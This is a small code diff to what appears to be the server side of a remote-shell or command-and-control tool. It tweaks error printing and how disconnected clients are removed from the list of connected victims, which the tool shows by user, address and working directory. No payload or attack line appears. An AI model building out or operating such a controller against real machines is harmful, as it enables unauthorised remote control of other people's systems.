@@ -100,7 +100,7 @@ def handleCommand():
             else:
                 print("Command unknwon. Use 'help' to list commands.")
         except Exception as e:
-            print("Invalid use of command!" + str(e))
+            print("Invalid use of command! \n" + str(e))
 
 
 def list_clients():
@@ -119,8 +119,8 @@ def list_clients():
                 CURRENT_CONNECTIONS.remove(i)
                 CURRENT_ADDRESSES.remove(i)
         except:
-            CURRENT_CONNECTIONS.remove(i)
-            CURRENT_ADDRESSES.remove(i)
+            del CURRENT_CONNECTIONS[i]
+            del CURRENT_ADDRESSES[i]
             continue
 
         results += str(i) + " - " + whoami + "@" + str(CURRENT_ADDRESSES[i][0]) + ":" + str(CURRENT_ADDRESSES[i][1]) + ":" + str(cwd) + "\n"
